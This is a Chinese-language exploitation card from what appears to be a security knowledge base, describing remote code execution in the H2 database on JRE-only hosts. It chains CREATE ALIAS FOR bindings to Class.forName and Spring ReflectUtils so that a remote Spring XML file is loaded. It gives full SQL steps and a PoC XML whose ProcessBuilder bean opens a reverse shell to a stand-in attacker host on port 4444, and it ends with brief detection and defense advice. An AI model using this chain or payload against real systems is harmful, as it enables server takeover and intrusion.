---
id: web-java-component-h2-jre-only-create-alias-static-method-rce
title: H2 JRE-only RCE：无 javac 时用 CREATE ALIAS FOR 静态方法 + Spring ReflectUtils 加载 XML 执行命令
type: scenario
domain: web
path: web/java/component
technique: h2-jre-only-create-alias-static-method-rce
tags:
- java
- h2
- jdbc
- jre
- create-alias
- reflection
- spring
- xml
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V226
  verified_at: '2026-11-07T06:56:01+08:00'
  notes: 已对照原文与41张图核对：CREATE ALIAS FOR 绑定 Class.forName/ReflectUtils.newInstance/Rdn.unescapeValue 的 SQL 与原文一致；ClassPathXmlApplicationContext 加载 XML、ProcessBuilder init-method=start 与原 XML 一致；原文未给本地复现截图，confidence medium；未复跑。
url: /docs/web/java/component/web-java-component-h2-jre-only-create-alias-static-method-rce/
draft: false
kb_aliases:
- H2 JRE RCE
- H2 无 javac
- CREATE ALIAS FOR 静态方法
- ReflectUtils.newInstance
- ClassPathXmlApplicationContext H2
- JRE 17 H2 RCE
---

## 一句话结论

当目标只有 JRE（无 `javac`）或 JDK15+ 已移除 JavaScript 引擎，H2 的 `CREATE ALIAS ... AS $$Java 源码$$` 无法编译；可改用 `CREATE ALIAS ... FOR '类.静态方法(签名)'` 直接绑定已存在的 Java 静态方法，组合 `Class.forName`、`org.springframework.cglib.core.ReflectUtils.newInstance`、`javax.naming.ldap.Rdn.unescapeValue` 等，构造 `ClassPathXmlApplicationContext` 实例并加载远程 XML，XML 中的 `ProcessBuilder` bean 执行命令。

## 原理

- **CREATE ALIAS 的两种形式**：`CREATE ALIAS name AS $$ Java 源码 $$` 需要 H2 调用 javac 编译源码；`CREATE ALIAS name FOR 'class.method'` 直接绑定到 classpath 中已存在的静态方法，不需要编译器。
- **可用静态方法原语**：`java.lang.Class.forName(String)` 返回 Class；`org.springframework.cglib.core.ReflectUtils.newInstance(Class, Class[], Object[])` 反射调用构造函数；`javax.naming.ldap.Rdn.unescapeValue(String)` 把字符串转成对象（避免在 SQL 中 `new`）。
- **构造 XML 上下文**：用 `CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext')` 取类，用 `NEW_INSTANCE(clazz, ARRAY[String.class], ARRAY[url])` 实例化，构造参数为远程 XML URL。
- **命令执行**：Spring 加载 XML 并实例化 bean；XML 中的 `ProcessBuilder` bean（`init-method="start"`）执行命令。整个过程不需要 javac 或 JS 引擎，适用于 JRE 17 等环境。
- **为什么有效**：H2 的 CREATE ALIAS FOR 只做方法绑定与反射调用，不限制目标静态方法的语义；攻击者用少量 JDK/Spring 自带方法即可拼出反射构造链。

## 触发条件

- 用户可控制 H2 JDBC URL 或在 H2 中执行 SQL（INIT、Console、SQL 注入等）。
- classpath 存在 H2 与 Spring（`ClassPathXmlApplicationContext`、`cglib` 的 `ReflectUtils`）；`javax.naming.ldap.Rdn` 在 JDK 中可用。
- 目标为 JRE-only 或 JDK15+（无 Nashorn/JS 引擎），无法使用 `//javascript` 触发器。
- 目标能访问攻击者 XML（http），或能读取本地 XML；进程有命令执行权限。

## 利用步骤

1. 确认 H2 可执行 INIT/任意 SQL，且 classpath 含 Spring Context 与 cglib。
2. 托管恶意 XML：`ProcessBuilder` bean，`init-method="start"`，参数为命令（如反弹 shell）。
3. 在 H2 中执行以下 SQL（可放在 JDBC URL 的 `INIT=` 中）：

```sql
CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';
SET @url_str='http://attacker/evil.xml';
SET @url_obj=UNESCAPE_VALUE(@url_str);
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');
CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);
```

4. H2 实例化 `ClassPathXmlApplicationContext`，加载 XML 并启动 ProcessBuilder，命令执行。
5. 若无 Spring，可改用 commons-beanutils + commons-io 写文件（cb 链）作为替代。

## PoC

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/attacker/4444 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

说明：该链来自公开研究（原文引用的 H2 RCE in JRE 17 思路），通过 `CREATE ALIAS FOR` 绑定静态方法绕过 javac 依赖；原文未给出本地复现截图，因此 confidence 标为 medium。`ReflectUtils` 位于 Spring cglib，若版本不同需调整类名/方法签名。

## 变体与关联

- **H2 INIT CREATE ALIAS**：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]] 使用 `AS $$Java 源码$$` + `CALL`，依赖 javac；本卡用 `FOR '静态方法'` 在 JRE-only/JDK15+ 环境替代。
- **H2 CVE-2022-23221**：[[web-java-component-h2-cve-2022-23221-forbid-creation-bypass-init-rce]] 覆盖 FORBID_CREATION 补丁绕过 + JavaScript 触发器；本卡是其无 JS 引擎场景的替代链。
- **高版本 JDK module 限制**：原文提到高版本 JDK 可用 Unsafe/反射绕过 module 限制，参考 DataEase 远程代码执行分析；也可用 `sun.misc.Unsafe` 修改 `Class.module` 后 `defineClass`。
- **非 Spring 环境**：使用 commons-beanutils + commons-io 写文件/加载字节码（cb 链）作为替代。
- **边界**：目标无 Spring/cglib、H2 禁止执行任意 SQL/INIT、URL 不可控、XML 不可达或模块限制无法绕过时，链不成立。

## 检测与防御

- 检测：H2 中出现 `CREATE ALIAS ... FOR` 绑定 `Class.forName`/`ReflectUtils.newInstance`/`Rdn.unescapeValue`；随后加载外部 XML/触发 ProcessBuilder；异常反射调用与命令启动。
- 防御：升级 H2 并禁止用户控制 JDBC URL/执行任意 SQL；限制 `CREATE ALIAS` 权限；移除不必要的 Spring/cglib 依赖；对 XML 外部加载与出网做限制。
- 响应：排查 H2 连接与 SQL 日志、清除恶意 ALIAS、轮换密钥并评估命令执行影响。
